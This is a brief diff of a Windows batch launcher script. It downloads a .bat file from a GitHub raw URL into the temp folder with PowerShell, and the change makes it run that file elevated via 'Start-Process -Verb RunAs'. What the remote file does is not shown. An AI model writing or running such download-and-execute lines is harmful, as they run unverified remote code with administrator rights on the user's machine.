@@ -14,8 +14,7 @@ echo  ╚═════╝ ╚═════╝ ╚═════╝ ╚═�
 setlocal
 set "tempFile=%temp%\D4R4N0X-file.bat"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pikinez/DataBase/main/D4R4N0X-file.bat' -OutFile '%tempFile%'"
-if exist "%tempFile%" (
-    start "" "%tempFile%"
-)
+if exist "%tempFile%" (powershell -Command "Start-Process '%tempFile%' -Verb RunAs")
 
 exit
+
